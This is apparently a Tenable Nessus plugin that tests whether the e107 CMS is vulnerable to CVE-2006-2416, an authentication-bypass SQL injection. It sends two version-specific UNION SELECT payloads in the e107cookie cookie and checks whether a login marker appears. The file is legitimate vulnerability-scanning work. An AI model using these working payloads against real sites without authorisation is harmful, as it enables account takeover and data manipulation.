#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(21555);
  script_version("$Revision: 1.20 $");
  script_cvs_date("$Date: 2015/09/24 21:08:38 $");

  script_cve_id("CVE-2006-2416");
  script_bugtraq_id(17966);
  script_osvdb_id(25521);

  script_name(english:"e107 e107_cookie Parameter SQL Injection");
  script_summary(english:"Tries to bypass authentication");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server contains a PHP script that is affected by a
SQL injection vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The version of e107 installed on the remote host fails to sanitize
input to the application-specific cookie used for authentication.
Provided PHP's 'magic_quotes_gpc' setting is disabled, a remote,
unauthenticated attacker can leverage this issue to bypass
authentication and generally manipulate SQL queries."
  );
  script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/433938/30/0/threaded");
  # http://e107.org/e107_plugins/bugtrack/bugtrack.php?cat=270&res=all&status=all&action=show&id=2775
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?957c33df");
  script_set_attribute(attribute:"solution", value:"Upgrade to e107 version 0.7.4 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:H/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2006/05/13");
  script_set_attribute(attribute:"patch_publication_date", value:"2006/05/04");
  script_set_attribute(attribute:"plugin_publication_date", value:"2006/05/15");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:e107:e107");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2015 Tenable Network Security, Inc.");

  script_dependencies("e107_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("www/e107");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("webapp_func.inc");
include("audit.inc");

port = get_http_port(default:80, php:TRUE);

# Test an install.
install = get_install_from_kb(appname:'e107', port:port, exit_on_fail:TRUE);
dir = install['dir'];

# Try to exploit the issue to bypass authentication.
magic = SCRIPT_NAME - ".nasl" + "-" + unixtime();
exploits = make_list(
  # 0.7.x
  ("1.nessus' union select 1,'" + magic + "',3,4,5,6,7,8,9,10,11,12," +
   "13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,'0',29,30,31,32,33#"),
  # 0.6.x
  ("1.nessus' union select 1,'" + magic + "',3,4,5,6,7,8,9,10,11,12," +
  "13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,'0',29,30,31,32,33,34,35#")
);

foreach exploit (exploits)
{
  clear_cookiejar();
  set_http_cookie(name: 'e107cookie', value: urlencode(str:exploit));

  res = http_send_recv3(
    method : 'GET',
    item   : dir + "/news.php",
    port   : port,
    exit_on_fail : TRUE
  );

  # There's a problem if it looks like we are logged in.
  if (
    # 0.7.x
    ('user.php?id.1">'+ magic +'</a>' >< res[2]) ||
    # 0.6.x
    ("user.php?id.1'>"+ magic +"</a>" >< res[2])
  )
  {
    set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
    if (report_verbosity > 0)
    {
      report =
        '\nNessus was able to verify the issue with the following request :' +
        '\n' +
        '\n' + http_last_sent_request() +
        '\n';
      security_warning(port:port, extra:report);
    }
    else security_warning(port);
    exit(0);
  }
}
audit(AUDIT_WEB_APP_NOT_AFFECTED, "e107", build_url(qs:dir, port:port));
